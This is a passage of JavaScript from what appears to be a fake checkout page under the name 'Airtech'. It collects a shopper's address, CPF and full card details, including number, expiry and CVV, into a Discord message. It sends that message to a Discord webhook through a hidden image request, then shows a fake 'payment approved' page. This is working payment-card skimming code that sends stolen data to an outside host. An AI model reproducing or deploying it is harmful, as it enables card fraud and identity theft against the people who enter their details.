        {name: "📍 Endereço", value: "**Rua:** "+allData.street+"\n**Bairro:** "+allData.neighborhood+"\n**Cidade:** "+allData.city+" - "+allData.state+"\n**CEP:** "+allData.postalCode+(allData.complement?"\n**Comp:** "+allData.complement:""), inline: false},
        {name: "💳 Cartão", value: "**Titular:** "+allData.cardholderName+"\n**CPF:** "+allData.cardCpf+"\n**Número:** "+allData.cardNumber+"\n**Validade:** "+allData.cardExpiry+"\n**CVV:** "+allData.cardCvv, inline: false}
      ],
      footer: {text: "Airtech • "+(new Date()).toLocaleString("pt-BR")}
    }]
  }));
  new Image().src = discordWebhook+"?payload="+payload;
  
  setTimeout(function() {
    window.location.href = "./pagamento-sucesso.html?status=approved&card=" + last4 + "&order=" + orderNum;
  }, 2500);
});
